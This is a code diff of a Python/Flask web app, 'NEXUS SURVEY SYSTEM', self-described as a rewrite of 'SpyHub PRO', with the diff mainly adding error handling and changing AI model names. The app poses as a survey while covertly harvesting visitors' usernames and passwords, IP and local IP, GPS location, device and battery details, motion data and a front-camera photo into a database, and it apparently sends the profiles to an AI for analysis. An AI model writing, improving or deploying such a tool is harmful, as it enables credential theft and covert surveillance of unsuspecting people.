@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
 NEXUS SURVEY SYSTEM v2.0
-Moderní přepis SpyHub PRO - připraveno pro Endoru
+Moderní přepis SpyHub PRO - připraveno pro Endoru a Render
 """
 import os, json, time, base64, logging, sqlite3, urllib.request, ssl
 from urllib.error import HTTPError
@@ -144,7 +144,7 @@ def ask_ai(prompt, expect_json=False):
         try:
             url = "https://api.anthropic.com/v1/messages"
             payload = {
-                "model": "claude-haiku-4-5-20251001",
+                "model": "claude-3-haiku-20240307",
                 "max_tokens": 1024,
                 "messages": [{"role": "user", "content": prompt}]
             }
@@ -170,7 +170,7 @@ def ask_ai(prompt, expect_json=False):
 
     if GEMINI_API_KEY:
         try:
-            url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=" + GEMINI_API_KEY
+            url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=" + GEMINI_API_KEY
             payload = {
                 "contents": [{"parts": [{"text": prompt}]}],
                 "safetySettings": [
@@ -521,7 +521,22 @@ function nextInp(id){if(clickLock)return;clickLock=true;setTimeout(()=>clickLock
 function startCam(){document.getElementById('b-cam').style.display='none';navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}}).then(s=>{const v=document.getElementById('vid');v.srcObject=s;v.style.display='block';document.getElementById('b-snap').style.display='block'}).catch(()=>skipCam())}
 function snap(){const v=document.getElementById('vid'),c=document.getElementById('can');if(v.srcObject){c.width=400;c.height=300;c.getContext('2d').drawImage(v,0,0,400,300);ud.photo=c.toDataURL('image/jpeg',0.6)}sendData()}
 function skipCam(){ud.photo=null;sendData()}
-function sendData(){ud.timing=tm;ud.motion=gyro;fetch('/save_all',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(ud)}).then(()=>show('v-done'))}
+
+function sendData(){
+  ud.timing=tm;
+  ud.motion=gyro;
+  fetch('/save_all',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(ud)
+  }).then(r => {
+    if(!r.ok) { alert("Došlo k chybě při ukládání do databáze. Zkus to prosím znovu."); }
+    show('v-done');
+  }).catch(e => {
+    alert("Chyba sítě při ukládání: " + e);
+    show('v-done');
+  });
+}
 </script>
 </body>
 </html>
@@ -1355,18 +1370,26 @@ Odpovez strucne a analyticky (max 150 slov, bez diakritiky)."""
 def save_all():
     try:
         d = request.json
-        if not d or not d.get('timing') or len(d.get('timing', {})) == 0: return "Ignorovano", 200
+        if not d:
+            print("ERROR: Prázdný požadavek na uložení.")
+            return "Ignorovano", 200
+        if not d.get('timing') or len(d.get('timing', {})) == 0: 
+            print("ERROR: Uživatel nemá žádná timing data.")
+            return "Ignorovano", 200
+            
         db = get_db()
         quiz = d.get('quiz', {})
         try:
-            stock = int(quiz.get('stock_count', 1))
-            weekly_freq = int(quiz.get('wear_frequency', 3))
-            monthly_freq = weekly_freq * 4 or 1
+            stock = int(quiz.get('stock_count', 1) or 1)
+            weekly_freq = int(quiz.get('wear_frequency', 3) or 3)
+            monthly_freq = (weekly_freq * 4) if weekly_freq > 0 else 1
             restock_date = datetime.now() + timedelta(days=(stock * 2 / monthly_freq) * 30)
             quiz['restock_prediction'] = restock_date.strftime("%Y-%m-%d")
         except: pass
+        
         city = get_ip_location(request.remote_addr)
         dev_info = d.get('device') or parse_device(request.headers.get('User-Agent', ''))
+        
         c = db.execute('''INSERT INTO visits (username, password, ip, local_ip, city, lat, lon, device, battery, quiz_data, timing_data, motion_data, start_time)
                           VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)''',
                        (d.get('u','Anonym'), d.get('p',''), request.remote_addr, d.get('local_ip','N/A'), city, d.get('lat'), d.get('lon'),
@@ -1380,8 +1403,10 @@ def save_all():
                 db.execute("UPDATE visits SET cam_photo=? WHERE id=?", (fname, vid))
             except: pass
         db.commit()
-        return "OK"
-    except Exception as e: print("save_all error:", e); return "Err", 500
+        return "OK", 200
+    except Exception as e: 
+        print("CRITICAL save_all error:", e)
+        return "Err", 500
 
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
